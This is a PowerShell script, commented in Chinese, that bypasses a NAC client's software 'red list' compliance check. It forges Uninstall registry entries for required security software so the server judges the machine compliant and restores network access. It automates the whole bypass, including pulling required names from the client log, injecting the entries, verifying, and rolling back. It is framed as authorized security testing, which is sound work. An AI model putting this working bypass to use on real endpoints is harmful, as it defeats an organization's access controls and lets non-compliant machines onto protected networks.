# ============================================================================
# NACC 合规绕过验证脚本（红名单软件伪造）
# ============================================================================
# 用途：在安装了启明星辰天珣 NAC 客户端的 Windows 终端上，验证「伪造软件红名单
#        → 客户端采集上报 → 服务器判定合规」这一安全评估结论。
#
# 法律与合规：仅限在【你拥有授权】的网络环境，对本单位采购评估的 NAC 系统做
#   安全测试。未经授权对第三方系统做此测试属违法行为。
#
# 原理（已实证，见报告 8.7 节）：
#   1. NAC 合规检查核心 = 「软件红名单检查」(Policy_Base_SoftwareRedList)
#   2. 客户端从注册表 Uninstall 采集已装软件（DisplayName → SoftwareInfo.xml）
#   3. 服务器比对红名单，缺失即判违规、限制上网
#   4. 因此：在注册表 Uninstall 伪造红名单软件条目，即可让服务器判定合规
#
# 触发机制（已实证）：客户端每 ~120 秒自动更新策略并重新执行 BaseSoft 检查，
#   无需手动触发，伪造后最多等 2 分钟自动生效。
#
# 用法：
#   PowerShell -ExecutionPolicy Bypass -File nac_compliance_bypass.ps1 -Action check
#   PowerShell -ExecutionPolicy Bypass -File nac_compliance_bypass.ps1 -Action inject
#   PowerShell -ExecutionPolicy Bypass -File nac_compliance_bypass.ps1 -Action verify
#   PowerShell -ExecutionPolicy Bypass -File nac_compliance_bypass.ps1 -Action rollback
#   PowerShell -ExecutionPolicy Bypass -File nac_compliance_bypass.ps1 -Action full   # 一键全流程
#
# 注意：需要【管理员权限】运行（写入 HKLM 注册表）。
# ============================================================================

param(
    [Parameter(Mandatory=$false)]
    [ValidateSet("check","inject","verify","rollback","full","auto-redlist")]
    [string]$Action = "check",

    # 伪造的软件名（默认是实测环境的值；不同环境请用 -Action auto-redlist 自动提取）
    [string[]]$SoftwareNames = @("北信源内网安全管理系统", "办公终端管控平台"),

    # 等待自动检查的秒数（客户端 ~120 秒周期，默认等 140 秒覆盖一个周期）
    [int]$WaitSeconds = 140,

    # NACC 安装目录
    [string]$NaccPath = "C:\Program Files (x86)\NACC"
)

$ErrorActionPreference = "Stop"
$UninstallPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
)
$BackupFile = Join-Path $env:TEMP "nacc_uninstall_backup_$([DateTime]::Now.ToString('yyyyMMdd_HHmmss')).xml"
$LogFile = Join-Path $NaccPath "log\CCInfo.log"

# ----------------------------------------------------------------------------
# 工具函数：读 GBK 编码文件（共享读，避免被 NACC 独占锁住）
# ----------------------------------------------------------------------------
function Read-GBKShared([string]$Path) {
    if (-not (Test-Path $Path)) { return $null }
    try {
        $fs = [System.IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite')
        $sr = New-Object System.IO.StreamReader($fs, [System.Text.Encoding]::GetEncoding("GBK"))
        $txt = $sr.ReadToEnd()
        $sr.Close(); $fs.Close()
        return $txt
    } catch { return $null }
}

# ----------------------------------------------------------------------------
# 工具函数：检查管理员权限
# ----------------------------------------------------------------------------
function Assert-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "[!] 需要管理员权限，请以管理员身份运行 PowerShell" -ForegroundColor Red
        exit 1
    }
}

# ----------------------------------------------------------------------------
# Action: check —— 前置检查（环境是否就绪）
# ----------------------------------------------------------------------------
function Invoke-Check {
    Write-Host "===== 前置检查 =====" -ForegroundColor Cyan
    if (-not (Test-Path $NaccPath)) {
        Write-Host "[!] NACC 未安装于 $NaccPath" -ForegroundColor Red
        exit 1
    }
    $svc = Get-Service -Name "NACCService" -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Host "  NACCService: $($svc.Status)"
    } else {
        Write-Host "  [!] NACCService 未找到"
    }
    $proc = Get-Process -Name "NACC" -ErrorAction SilentlyContinue
    Write-Host "  NACC 进程: $(if ($proc) { '运行中 (PID ' + ($proc.Id -join ',') + ')' } else { '未运行' })"

    # 当前合规状态（从日志最后一条 BaseSoft 结果判断）
    $log = Read-GBKShared $LogFile
    if ($log) {
        $last = ($log -split "`r?`n") | Where-Object { $_ -match "SoftwareRedList" } | Select-Object -Last 1
        if ($last) {
            if ($last -match 'statusinfo=""' -or $last -match 'statusinfoEx=""') {
                Write-Host "  当前合规状态: ✅ 合规（无违规项）" -ForegroundColor Green
            } elseif ($last -match '需安装') {
                Write-Host "  当前合规状态: ❌ 违规（有需安装软件）" -ForegroundColor Yellow
            }
            Write-Host "  日志原文: $($last.Substring([Math]::Max(0, $last.Length - 300)))"
        }
    }
    Write-Host ""
}

# ----------------------------------------------------------------------------
# Action: auto-redlist —— 从日志自动提取红名单软件名
# ----------------------------------------------------------------------------
function Invoke-AutoRedlist {
    Write-Host "===== 从日志自动提取红名单软件名 =====" -ForegroundColor Cyan
    $log = Read-GBKShared $LogFile
    if (-not $log) { Write-Host "[!] 无法读取日志"; exit 1 }

    $matches = ($log -split "`r?`n") | Where-Object { $_ -match 'statusinfoEx="需安装:(.+?)"' } | Select-Object -Last 1
    if (-not $matches) {
        Write-Host "[!] 日志中未找到红名单违规记录（可能当前已合规，或日志已轮转）"
        Write-Host "    可手动指定: -SoftwareNames @('软件名1','软件名2')"
        exit 1
    }
    if ($matches -match 'statusinfoEx="需安装:([^"]+)"') {
        $names = $Matches[1] -split ','
        Write-Host "  提取到的红名单软件名:" -ForegroundColor Green
        $names | ForEach-Object { Write-Host "    - $_" }
        Write-Host ""
        Write-Host "  可直接用以下命令注入:"
        $quoted = ($names | ForEach-Object { "'$_'" }) -join ','
        Write-Host "    .\nac_compliance_bypass.ps1 -Action inject -SoftwareNames @($quoted)" -ForegroundColor Cyan
        $script:DetectedSoftwareNames = $names
    }
}

# ----------------------------------------------------------------------------
# Action: inject —— 伪造红名单软件条目
# ----------------------------------------------------------------------------
function Invoke-Inject {
    Write-Host "===== 伪造红名单软件条目 =====" -ForegroundColor Cyan

    if ($SoftwareNames.Count -eq 0) {
        Write-Host "[!] 未指定软件名，请用 -SoftwareNames @('软件名1','软件名2') 或先 -Action auto-redlist"
        exit 1
    }

    # 备份现有相关键（可回滚）
    $backup = @()
    foreach ($p in $UninstallPaths) {
        if (Test-Path $p) {
            Get-ChildItem $p -ErrorAction SilentlyContinue | ForEach-Object {
                $backup += $_.PSPath
            }
        }
    }

    # 为每个软件名生成一个条目
    foreach ($name in $SoftwareNames) {
        # 用软件名的拼音/哈希生成稳定子键名（避免特殊字符）
        $keyName = "NACRedList_" + [Convert]::ToHexString([System.Text.Encoding]::UTF8.GetBytes($name)).Substring(0, 12)
        foreach ($p in $UninstallPaths) {
            $key = Join-Path $p $keyName
            if (Test-Path $key) { Remove-Item $key -Recurse -Force -ErrorAction SilentlyContinue }
            New-Item -Path $key -Force | Out-Null
            Set-ItemProperty -Path $key -Name "DisplayName" -Value $name
            Set-ItemProperty -Path $key -Name "DisplayVersion" -Value "1.0.0.1"
            Set-ItemProperty -Path $key -Name "Publisher" -Value $name
            Set-ItemProperty -Path $key -Name "InstallLocation" -Value "C:\Program Files (x86)\$keyName"
            Set-ItemProperty -Path $key -Name "UninstallString" -Value "C:\Program Files (x86)\$keyName\uninst.exe"
            Set-ItemProperty -Path $key -Name "DisplayIcon" -Value "C:\Program Files (x86)\$keyName\uninst.exe"
            Set-ItemProperty -Path $key -Name "NoModify" -Value 1 -Type DWord
            Set-ItemProperty -Path $key -Name "NoRepair" -Value 1 -Type DWord
            Write-Host "  [已注入] $p\$keyName → DisplayName=$name" -ForegroundColor Green
        }
    }

    Write-Host ""
    Write-Host "  注入完成。客户端将每 ~120 秒自动重新检查，或等待 $WaitSeconds 秒后 verify。" -ForegroundColor Cyan
}

# ----------------------------------------------------------------------------
# Action: verify —— 等待并验证合规结果
# ----------------------------------------------------------------------------
function Invoke-Verify {
    Write-Host "===== 等待客户端自动重新检查（$WaitSeconds 秒）=====" -ForegroundColor Cyan

    # 记录起始日志长度
    $log = Read-GBKShared $LogFile
    $startLen = if ($log) { $log.Length } else { 0 }

    # 等待自动策略更新（~120 秒周期）
    for ($i = $WaitSeconds; $i -gt 0; $i -= 10) {
        $remaining = [Math]::Min(10, $i)
        Start-Sleep -Seconds $remaining
        Write-Host "  等待中... 剩余 $([Math]::Max(0, $i - $remaining)) 秒"
    }

    Write-Host ""
    Write-Host "===== 验证结果 =====" -ForegroundColor Cyan

    # 1. 检查 SoftwareInfo.xml 是否收录伪造软件
    $sw = Read-GBKShared (Join-Path $NaccPath "SecData\SoftwareInfo.xml")
    if ($sw) {
        foreach ($name in $SoftwareNames) {
            if ($sw -match [regex]::Escape($name)) {
                Write-Host "  ✅ SoftwareInfo.xml 已收录: $name" -ForegroundColor Green
            } else {
                Write-Host "  ⏳ SoftwareInfo.xml 尚未收录: $name（可能还在等待采集）" -ForegroundColor Yellow
            }
        }
    }

    # 2. 检查日志里的最新 BaseSoft 结果
    $log = Read-GBKShared $LogFile
    if ($log) {
        $last = ($log -split "`r?`n") | Where-Object { $_ -match "SoftwareRedList" } | Select-Object -Last 1
        if ($last) {
            Write-Host ""
            Write-Host "  最新红名单检查结果:" -ForegroundColor Cyan
            if ($last -match 'statusinfo=""' -or $last -match 'statusinfoEx=""' -or $last -match 'status="1"') {
                Write-Host "  ✅ 合规！服务器判定通过（无违规项）" -ForegroundColor Green
            } elseif ($last -match '需安装') {
                Write-Host "  ❌ 仍违规（可能采集未完成，请再等 2 分钟重试 verify）" -ForegroundColor Yellow
            }
            Write-Host "  日志原文: $($last.Substring([Math]::Max(0, $last.Length - 400)))"
        }
    }

    Write-Host ""
    Write-Host "  最终判定以浏览器/客户端 GUI 显示的安检结果为准。" -ForegroundColor Cyan
}

# ----------------------------------------------------------------------------
# Action: rollback —— 清理伪造条目
# ----------------------------------------------------------------------------
function Invoke-Rollback {
    Write-Host "===== 回滚：清理伪造软件条目 =====" -ForegroundColor Cyan
    $cleaned = 0
    foreach ($p in $UninstallPaths) {
        if (Test-Path $p) {
            Get-ChildItem $p -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -like "NACRedList_*" } | ForEach-Object {
                Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                Write-Host "  [已清理] $($_.PSPath)" -ForegroundColor Yellow
                $cleaned++
            }
        }
    }
    if ($cleaned -eq 0) {
        Write-Host "  未发现 NACRedList_* 条目（可能已清理或未注入）"
    } else {
        Write-Host "  共清理 $cleaned 个条目。客户端将自动恢复为违规状态。" -ForegroundColor Green
    }
}

# ----------------------------------------------------------------------------
# Action: full —— 一键全流程
# ----------------------------------------------------------------------------
function Invoke-Full {
    Invoke-Check
    Invoke-Inject
    Invoke-Verify
}

# ----------------------------------------------------------------------------
# 入口
# ----------------------------------------------------------------------------
Assert-Admin
switch ($Action) {
    "check"       { Invoke-Check }
    "inject"      { Invoke-Inject }
    "verify"      { Invoke-Verify }
    "rollback"    { Invoke-Rollback }
    "full"        { Invoke-Full }
    "auto-redlist"{ Invoke-AutoRedlist }
}
